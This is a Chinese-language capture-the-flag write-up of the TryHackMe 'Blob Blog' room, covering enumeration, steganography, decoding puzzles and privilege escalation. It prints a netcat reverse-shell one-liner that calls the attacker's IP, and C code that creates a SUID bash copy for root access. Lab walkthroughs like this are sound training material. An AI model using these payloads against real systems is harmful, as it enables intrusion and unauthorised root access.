# The Blob Blog

你能把盒子扎根吗？

---

比赛比完了，结果还可以，满意。当然这一切也少不了TryHackMe的功劳，thm中等难度的房间我自认为打的差不多了，准备回去复习红队，然后挑战大boss, hololive域渗透

## 端口扫描

循例 nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/683a1765f9f8421da7dc3133b5264fe9.png)

## Web枚举

进入80，发现是apache默认页面

查看页面源代码，发现一串长得跟base64一样的字符串

![在这里插入图片描述](https://img-blog.csdnimg.cn/28d0fd40bcd0456ea6781b1ba65a3f42.png)

Cyberchef解码，见面很多次了，brainfuck

![在这里插入图片描述](https://img-blog.csdnimg.cn/0323b354a5a64caa9b7f7e19f50d7af4.png)

在线解码

![在这里插入图片描述](https://img-blog.csdnimg.cn/409ca41df78b4c0cbb48ef9d5926322e.png)

这段话非常明显，暗示我们去端口敲门

使用nc一句话

![在这里插入图片描述](https://img-blog.csdnimg.cn/1816175568d74f57b9a54411aec81e3f.png)

nmap再扫一次，可以看到多了好几个端口

![在这里插入图片描述](https://img-blog.csdnimg.cn/284e1c7644cf4776ab2e068d757063ab.png)

在同样的地方，页面源代码下面还有一句话

![在这里插入图片描述](https://img-blog.csdnimg.cn/92f68b2677aa441da5e0a60edb20cb51.png)

cyberchef解码，发现是base58

![在这里插入图片描述](https://img-blog.csdnimg.cn/772c661f9ac04728b50dcb3f0aa1dd56.png)

在445端口下的http，主页也是默认页面，但页面源代码给出了一组明文凭据

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f20eda2d962452c81e69693bf91ff4f.png)

先到8080端口再看看

也是apache默认页面，扫一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/28c8e9b4cf5f48b49baebda328b0d4c2.png)

是一个登录页面，先尝试刚刚获得的凭据

![在这里插入图片描述](https://img-blog.csdnimg.cn/3ad751f5eb9e4ca0935b80291a36ce2e.png)

似乎登录不进去


## FTP枚举

使用刚刚获得的第二组凭据，登录ftp

![在这里插入图片描述](https://img-blog.csdnimg.cn/d12525dd659b48e195af8dea64afe5a2.png)

有个jpeg，下载

![在这里插入图片描述](https://img-blog.csdnimg.cn/fc3f7ecb1d294918a09e9b6801c52334.png)

steghide，使用刚刚获得的第一组凭据，成功提取一个.txt

![在这里插入图片描述](https://img-blog.csdnimg.cn/867be02f23f14b2b8dd16fdc92fb7a9f.png)

查看out.txt, 又提供了一组凭据和一个疑似web中的路径

![在这里插入图片描述](https://img-blog.csdnimg.cn/7db4078dd4094863a912b90897250ba4.png)

这组凭据无法登录ftp、ssh

## Web枚举 - 2

跟着指引，查看刚刚获得的目录路径

![在这里插入图片描述](https://img-blog.csdnimg.cn/c0f8e7ea234b4a2598cdf51385887ed0.png)

很显然，这引导我们去刚刚的blog，并且使用刚刚获得的zcv的凭据登录

但是登录依然失败

为了节省时间看一眼wp，这个凭据是经过vigenere加密

![在这里插入图片描述](https://img-blog.csdnimg.cn/437ec0fe135a4af98fa0e0a3042b953a.png)

成功登录进来

![在这里插入图片描述](https://img-blog.csdnimg.cn/b763691a4ed74498bc7205d3a6c60271.png)

## Reverse Shell

当我尝试whoami的时候，再查看review，会发现它执行了这个命令

![在这里插入图片描述](https://img-blog.csdnimg.cn/d4f562d3c60c4f3b8fa35911581ae353.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/c307fe2b74f541338e1a66a5f1e135de.png)

那就直接尝试反向shell，payload：

	mkfifo /tmp/f1;nc 10.9.62.153 8888 < /tmp/f1 | /bin/bash > /tmp/f1

![在这里插入图片描述](https://img-blog.csdnimg.cn/21ece4229cfa4434a23303ffcf666e04.png)

getshell

## 横向移动

就当我在到处寻找有用的信息的时候，突然有一个疑似定时任务的消息出现在我的shell中

![在这里插入图片描述](https://img-blog.csdnimg.cn/79ef4f43e4ba4d11bad67287220fee88.png)

这使得我立即查看/etc/crontab

![在这里插入图片描述](https://img-blog.csdnimg.cn/2ebca86333e648adb607e8cd0549d551.png)

好吧，我们现在还没有权限进入bobloblaw

find suid，发现一个可疑的文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/367735d154984e24b0a17411bc8c22cc.png)

当我使用ltrace的时候发现这么一句话

![在这里插入图片描述](https://img-blog.csdnimg.cn/383af28f7b1d45b8bec09ece8cb13f8d.png)

刚刚在web的blog页面上可以看到有1-6个，尝试一下之后成功移动过去

![在这里插入图片描述](https://img-blog.csdnimg.cn/f19cf87d082c42f0bbee3f2e5cc0a1de.png)

user flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/1fff4f442f484cf9bdee0d04e3cabe80.png)

## 权限提升

虽然我们知道了cronjob有东西，但是.uh_oh文件夹我们依然没有权限访问

我想找到一直在shell弹出那句话的定时任务进程

这里传个pspy64过去进行分析，发现这么一行信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/6fcb8e52a7b04de89ff6998f61f556b7.png)

它以root权限运行，并且会定时的编译boring_file.c并执行，而恰好该文件我们所有

将该c文件传回攻击机

![在这里插入图片描述](https://img-blog.csdnimg.cn/5d3896f1bbd34c8396b66be91f6e5116.png)

修改内容：

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	setuid(0);
	setgid(0);
	system("cp /bin/bash /tmp/bash;chmod +s /tmp/bash");
	return 0;
}
```

将其base64

![在这里插入图片描述](https://img-blog.csdnimg.cn/21c6ff7250ef4400ad0a5846c7563592.png)

写入.boring_file.c

![在这里插入图片描述](https://img-blog.csdnimg.cn/bf261deb18f74b428664196fbdba3373.png)

静等一会，它出现了

![在这里插入图片描述](https://img-blog.csdnimg.cn/f895aec3977e4ae88d4f98aae2b44fcb.png)

利用

![在这里插入图片描述](https://img-blog.csdnimg.cn/48e78cd263c24193bf7e6e06605905cc.png)

getroot
